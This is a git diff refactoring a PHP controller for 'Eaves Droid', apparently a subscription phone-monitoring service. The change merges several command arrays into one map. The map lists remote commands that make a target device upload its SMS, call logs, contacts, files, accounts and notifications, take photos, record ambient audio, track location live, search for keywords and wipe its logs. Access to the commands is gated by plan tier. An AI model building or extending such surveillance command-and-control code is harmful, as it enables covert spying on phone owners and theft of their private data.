@@ -10,6 +10,48 @@ class FCMCommandController extends BaseController
 {
     use ResponseTrait;
 
+    private const COMMAND_MAP = [
+        'cmd_contacts' => ['feature' => 'fcm_fetch_contacts', 'action' => 'fetch_contacts', 'label' => 'Fetch Contacts', 'desc' => 'Requests the device to upload its contact list.'],
+        'cmd_beep' => ['feature' => 'fcm_cmd_beep', 'action' => 'play_beep', 'label' => 'Play Test Beep', 'desc' => 'Sends a test beep command to verify the device connection.'],
+        'cmd_health_check' => ['feature' => 'fcm_cmd_health', 'action' => null, 'label' => null, 'desc' => null],
+        'cmd_apps' => ['feature' => 'fcm_fetch_apps', 'action' => 'fetch_apps', 'label' => 'Fetch Installed Apps', 'desc' => 'Requests the device to upload a list of all installed applications.'],
+        'cmd_calls' => ['feature' => 'fcm_fetch_calls', 'action' => 'fetch_calls', 'label' => 'Fetch Call Logs', 'desc' => 'Requests the device to upload its call log history.'],
+        'cmd_sms' => ['feature' => 'fcm_fetch_sms', 'action' => 'fetch_sms', 'label' => 'Fetch SMS', 'desc' => 'Requests the device to upload its SMS messages to the server.'],
+        'cmd_location' => ['feature' => 'fcm_fetch_location', 'action' => 'fetch_location', 'label' => 'Fetch Location', 'desc' => 'Requests the device to upload its current GPS location.'],
+        'cmd_telemetry_soft' => ['feature' => 'fcm_fetch_usage', 'action' => null, 'label' => null, 'desc' => null],
+        'cmd_capture_photo' => ['feature' => 'fcm_cmd_camera', 'action' => 'capture_photo', 'label' => 'Capture Photo', 'desc' => 'Triggers the device camera to capture and upload a photo.'],
+        'cmd_record_audio' => ['feature' => 'fcm_cmd_audio', 'action' => 'record_audio', 'label' => 'Record Audio', 'desc' => 'Triggers the device microphone to record and upload ambient audio.'],
+        'cmd_files' => ['feature' => 'fcm_fetch_files', 'action' => 'fetch_files', 'label' => 'Fetch Files', 'desc' => 'Requests the device to upload its file directory listing.'],
+        'cmd_fetch_file' => ['feature' => 'fcm_file_management', 'action' => 'fetch_file', 'label' => 'Fetch Specific File', 'desc' => 'Requests a specific file from the device by path.'],
+        'cmd_delete_file' => ['feature' => 'fcm_file_management', 'action' => null, 'label' => null, 'desc' => null],
+        'cmd_software_misc' => ['feature' => 'fcm_fetch_soft_misc', 'action' => null, 'label' => null, 'desc' => null],
+        'cmd_hardware_misc' => ['feature' => 'fcm_fetch_hard_misc', 'action' => null, 'label' => null, 'desc' => null],
+        'cmd_all' => ['feature' => 'fcm_fetch_all', 'action' => 'sync_all', 'label' => 'Sync All Data Categories', 'desc' => 'Requests the device to upload all available data categories.'],
+        'cmd_reset_app' => ['feature' => 'fcm_cmd_reset_app', 'action' => 'reset_app', 'label' => 'App Reset', 'desc' => 'Resets the Eaves Droid app on the device to its initial state.'],
+        'cmd_deactivate' => ['feature' => 'fcm_cmd_deactivate', 'action' => 'deactivate_app', 'label' => 'App Deactivation', 'desc' => 'Deactivates the Eaves Droid app, stopping all monitoring.'],
+        'cmd_logout' => ['feature' => 'fcm_cmd_logout', 'action' => 'logout_user', 'label' => 'User Logout', 'desc' => 'LogsController out the current session on the device.'],
+        'cmd_uninstall_preserve' => ['feature' => 'fcm_cmd_uninstall_preserve', 'action' => 'uninstall_preserve', 'label' => 'Uninstall (Keep Data)', 'desc' => 'Uninstalls the app while preserving collected data on the server.'],
+        'cmd_uninstall_wipe' => ['feature' => 'fcm_cmd_uninstall_wipe', 'action' => 'uninstall_wipe', 'label' => 'Uninstall (Wipe All)', 'desc' => 'Uninstalls the app and wipes all collected data from the device.'],
+        'cmd_search_data' => ['feature' => null, 'action' => 'search_data', 'label' => 'Keyword Search', 'desc' => 'Searches the device for files or data matching specific keywords.'],
+        'cmd_start_tracking' => ['feature' => null, 'action' => 'start_tracking', 'label' => 'Start Live Tracking', 'desc' => 'Instructs the device to begin periodic location tracking for a set duration.'],
+        'cmd_context' => ['feature' => null, 'action' => 'fetch_context', 'label' => 'Fetch Context (Activity + LocationController)', 'desc' => 'Requests the device to upload current activity recognition and location context.'],
+        'cmd_usage' => ['feature' => null, 'action' => 'fetch_usage', 'label' => 'Fetch App Usage Stats', 'desc' => 'Requests the device to upload application usage statistics.'],
+        'cmd_notifications' => ['feature' => null, 'action' => 'fetch_notifications', 'label' => 'Fetch Notifications', 'desc' => 'Requests the device to upload its recent notification history.'],
+        'cmd_device_info' => ['feature' => null, 'action' => 'fetch_device_info', 'label' => 'Fetch Device Info', 'desc' => 'Requests the device to upload hardware and software information.'],
+        'cmd_sensors' => ['feature' => null, 'action' => 'fetch_sensors', 'label' => 'Fetch Sensor Data', 'desc' => 'Requests the device to upload current sensor readings.'],
+        'cmd_network' => ['feature' => null, 'action' => 'fetch_network', 'label' => 'Fetch Network Info', 'desc' => 'Requests the device to upload network connection details.'],
+        'cmd_bluetooth' => ['feature' => null, 'action' => 'fetch_bluetooth', 'label' => 'Fetch Bluetooth Devices', 'desc' => 'Requests the device to upload paired and visible Bluetooth devices.'],
+        'cmd_calendar' => ['feature' => null, 'action' => 'fetch_calendar', 'label' => 'Fetch Calendar Events', 'desc' => 'Requests the device to upload calendar events.'],
+        'cmd_accounts' => ['feature' => null, 'action' => 'fetch_accounts', 'label' => 'Fetch Accounts', 'desc' => 'Requests the device to upload configured account information.'],
+        'cmd_siren' => ['feature' => null, 'action' => 'play_siren', 'label' => 'Play Siren', 'desc' => 'Plays a loud siren sound on the device for locating it.'],
+        'cmd_wipe_logs' => ['feature' => null, 'action' => 'wipe_logs', 'label' => 'Wipe Logs', 'desc' => 'Instructs the device to clear its local log data.'],
+        'cmd_locate' => ['feature' => null, 'action' => 'locate_device', 'label' => 'Locate Device', 'desc' => 'Triggers an immediate locate command on the device.'],
+        'cmd_sync_now' => ['feature' => null, 'action' => 'sync_data', 'label' => 'Sync Data Now', 'desc' => 'Triggers an immediate data sync on the device.'],
+        'cmd_reactivate' => ['feature' => null, 'action' => 'reactivate_app', 'label' => 'App Reactivation', 'desc' => 'Reactivates the Eaves Droid app, resuming all monitoring.'],
+        'cmd_update_prefs' => ['feature' => null, 'action' => 'update_settings', 'label' => 'Update Settings', 'desc' => 'Updates device settings and preferences remotely.'],
+        'cmd_open_permission' => ['feature' => null, 'action' => 'open_permission', 'label' => 'Open Permission', 'desc' => 'Triggers the device to open a specific permission settings screen.'],
+    ];
+
     private $credentialsPath = WRITEPATH . 'firebase_credentials.json';
     private $projectId = 'project-2026-35b76';
 
@@ -120,33 +162,8 @@ class FCMCommandController extends BaseController
         }
 
         // Validate command access against active subscription plan features
-        $cmdFeatureMap = [
-            'cmd_contacts'               => 'fcm_fetch_contacts',
-            'cmd_beep'                   => 'fcm_cmd_beep',
-            'cmd_health_check'           => 'fcm_cmd_health',
-            'cmd_apps'                   => 'fcm_fetch_apps',
-            'cmd_calls'                  => 'fcm_fetch_calls',
-            'cmd_sms'                    => 'fcm_fetch_sms',
-            'cmd_location'               => 'fcm_fetch_location',
-            'cmd_telemetry_soft'         => 'fcm_fetch_usage',
-            'cmd_capture_photo'          => 'fcm_cmd_camera',
-            'cmd_record_audio'           => 'fcm_cmd_audio',
-            'cmd_files'                  => 'fcm_fetch_files',
-            'cmd_fetch_file'             => 'fcm_file_management',   // Platinum only
-            'cmd_delete_file'            => 'fcm_file_management',   // Platinum only
-            'cmd_software_misc'          => 'fcm_fetch_soft_misc',
-            'cmd_hardware_misc'          => 'fcm_fetch_hard_misc',
-            'cmd_all'                    => 'fcm_fetch_all',
-            
-            // Device management commands
-            'cmd_reset_app'              => 'fcm_cmd_reset_app',
-            'cmd_deactivate'             => 'fcm_cmd_deactivate',
-            'cmd_logout'                 => 'fcm_cmd_logout',
-            'cmd_uninstall_preserve'     => 'fcm_cmd_uninstall_preserve',
-            'cmd_uninstall_wipe'         => 'fcm_cmd_uninstall_wipe',
-        ];
 
-        if (array_key_exists($command, $cmdFeatureMap)) {
+        if (isset(self::COMMAND_MAP[$command]['feature'])) {
             $deviceProfile = $db->table('tbl_device_profiles')
                 ->select('owner_id')
                 ->where('fcm_token', $fcmToken)
@@ -162,7 +179,7 @@ class FCMCommandController extends BaseController
             
             if ($ownerId) {
                 $planGate = new \App\Services\PlanGate();
-                $reqFeature = $cmdFeatureMap[$command];
+                $reqFeature = self::COMMAND_MAP[$command]['feature'];
                 if (!$planGate->hasFeature($ownerId, $reqFeature)) {
                     return $this->fail('Forbidden: Target device plan does not permit this command.', 403);
                 }
@@ -343,44 +360,7 @@ class FCMCommandController extends BaseController
                 $userId = (int) auth()->user()->id;
             }
 
-            $actionMap = [
-                'cmd_sms' => 'fetch_sms',
-                'cmd_calls' => 'fetch_calls',
-                'cmd_contacts' => 'fetch_contacts',
-                'cmd_search_data' => 'search_data',
-                'cmd_capture_photo' => 'capture_photo',
-                'cmd_record_audio' => 'record_audio',
-                'cmd_files' => 'fetch_files',
-                'cmd_fetch_file' => 'fetch_file',
-                'cmd_location' => 'fetch_location',
-                'cmd_start_tracking' => 'start_tracking',
-                'cmd_context' => 'fetch_context',
-                'cmd_apps' => 'fetch_apps',
-                'cmd_usage' => 'fetch_usage',
-                'cmd_notifications' => 'fetch_notifications',
-                'cmd_device_info' => 'fetch_device_info',
-                'cmd_sensors' => 'fetch_sensors',
-                'cmd_network' => 'fetch_network',
-                'cmd_bluetooth' => 'fetch_bluetooth',
-                'cmd_calendar' => 'fetch_calendar',
-                'cmd_accounts' => 'fetch_accounts',
-                'cmd_beep' => 'play_beep',
-                'cmd_siren' => 'play_siren',
-                'cmd_wipe_logs' => 'wipe_logs',
-                'cmd_locate' => 'locate_device',
-                'cmd_all' => 'sync_all',
-                'cmd_sync_now' => 'sync_data',
-                'cmd_reset_app' => 'reset_app',
-                'cmd_deactivate' => 'deactivate_app',
-                'cmd_reactivate' => 'reactivate_app',
-                'cmd_logout' => 'logout_user',
-                'cmd_uninstall_preserve' => 'uninstall_preserve',
-                'cmd_uninstall_wipe' => 'uninstall_wipe',
-                'cmd_update_prefs' => 'update_settings',
-                'cmd_open_permission' => 'open_permission',
-            ];
-
-            $actionType = $actionMap[$command] ?? ('remote_cmd_' . str_replace('cmd_', '', $command));
+            $actionType = self::COMMAND_MAP[$command]['action'] ?? ('remote_cmd_' . str_replace('cmd_', '', $command));
 
             $logId = $logModel->logAction([
                 'user_id' => $userId,
@@ -596,82 +576,8 @@ return json_decode($response);
         if (function_exists('auth') && auth()->loggedIn()) {
             $initiatorName = auth()->user()->username ?? 'System';
         }
-
-        $commandLabels = [
-            'cmd_sms' => 'Fetch SMS',
-            'cmd_calls' => 'Fetch Call Logs',
-            'cmd_contacts' => 'Fetch Contacts',
-            'cmd_search_data' => 'Keyword Search',
-            'cmd_capture_photo' => 'Capture Photo',
-            'cmd_record_audio' => 'Record Audio',
-            'cmd_files' => 'Fetch Files',
-            'cmd_fetch_file' => 'Fetch Specific File',
-            'cmd_location' => 'Fetch Location',
-            'cmd_start_tracking' => 'Start Live Tracking',
-            'cmd_context' => 'Fetch Context (Activity + LocationController)',
-            'cmd_apps' => 'Fetch Installed Apps',
-            'cmd_usage' => 'Fetch App Usage Stats',
-            'cmd_notifications' => 'Fetch Notifications',
-            'cmd_device_info' => 'Fetch Device Info',
-            'cmd_sensors' => 'Fetch Sensor Data',
-            'cmd_network' => 'Fetch Network Info',
-            'cmd_bluetooth' => 'Fetch Bluetooth Devices',
-            'cmd_calendar' => 'Fetch Calendar Events',
-            'cmd_accounts' => 'Fetch Accounts',
-            'cmd_beep' => 'Play Test Beep',
-            'cmd_siren' => 'Play Siren',
-            'cmd_wipe_logs' => 'Wipe Logs',
-            'cmd_locate' => 'Locate Device',
-            'cmd_all' => 'Sync All Data Categories',
-            'cmd_sync_now' => 'Sync Data Now',
-            'cmd_reset_app' => 'App Reset',
-            'cmd_deactivate' => 'App Deactivation',
-            'cmd_reactivate' => 'App Reactivation',
-            'cmd_logout' => 'User Logout',
-            'cmd_uninstall_preserve' => 'Uninstall (Keep Data)',
-            'cmd_uninstall_wipe' => 'Uninstall (Wipe All)',
-            'cmd_update_prefs' => 'Update Settings',
-            'cmd_open_permission' => 'Open Permission',
-        ];
-        $label = $commandLabels[$command] ?? str_replace('_', ' ', str_replace('cmd_', '', $command));
-
-        $commandDescriptions = [
-            'cmd_sms' => 'Requests the device to upload its SMS messages to the server.',
-            'cmd_calls' => 'Requests the device to upload its call log history.',
-            'cmd_contacts' => 'Requests the device to upload its contact list.',
-            'cmd_search_data' => 'Searches the device for files or data matching specific keywords.',
-            'cmd_capture_photo' => 'Triggers the device camera to capture and upload a photo.',
-            'cmd_record_audio' => 'Triggers the device microphone to record and upload ambient audio.',
-            'cmd_files' => 'Requests the device to upload its file directory listing.',
-            'cmd_fetch_file' => 'Requests a specific file from the device by path.',
-            'cmd_location' => 'Requests the device to upload its current GPS location.',
-            'cmd_start_tracking' => 'Instructs the device to begin periodic location tracking for a set duration.',
-            'cmd_context' => 'Requests the device to upload current activity recognition and location context.',
-            'cmd_apps' => 'Requests the device to upload a list of all installed applications.',
-            'cmd_usage' => 'Requests the device to upload application usage statistics.',
-            'cmd_notifications' => 'Requests the device to upload its recent notification history.',
-            'cmd_device_info' => 'Requests the device to upload hardware and software information.',
-            'cmd_sensors' => 'Requests the device to upload current sensor readings.',
-            'cmd_network' => 'Requests the device to upload network connection details.',
-            'cmd_bluetooth' => 'Requests the device to upload paired and visible Bluetooth devices.',
-            'cmd_calendar' => 'Requests the device to upload calendar events.',
-            'cmd_accounts' => 'Requests the device to upload configured account information.',
-            'cmd_beep' => 'Sends a test beep command to verify the device connection.',
-            'cmd_siren' => 'Plays a loud siren sound on the device for locating it.',
-            'cmd_wipe_logs' => 'Instructs the device to clear its local log data.',
-            'cmd_locate' => 'Triggers an immediate locate command on the device.',
-            'cmd_all' => 'Requests the device to upload all available data categories.',
-            'cmd_sync_now' => 'Triggers an immediate data sync on the device.',
-            'cmd_reset_app' => 'Resets the Eaves Droid app on the device to its initial state.',
-            'cmd_deactivate' => 'Deactivates the Eaves Droid app, stopping all monitoring.',
-            'cmd_reactivate' => 'Reactivates the Eaves Droid app, resuming all monitoring.',
-            'cmd_logout' => 'LogsController out the current session on the device.',
-            'cmd_uninstall_preserve' => 'Uninstalls the app while preserving collected data on the server.',
-            'cmd_uninstall_wipe' => 'Uninstalls the app and wipes all collected data from the device.',
-            'cmd_update_prefs' => 'Updates device settings and preferences remotely.',
-            'cmd_open_permission' => 'Triggers the device to open a specific permission settings screen.',
-        ];
-        $description = $commandDescriptions[$command] ?? '';
+        $label = self::COMMAND_MAP[$command]['label'] ?? str_replace('_', ' ', str_replace('cmd_', '', $command));
+        $description = self::COMMAND_MAP[$command]['desc'] ?? '';
 
         $request = service('request');
         $ip = $request->getIPAddress() ?? 'Unknown';
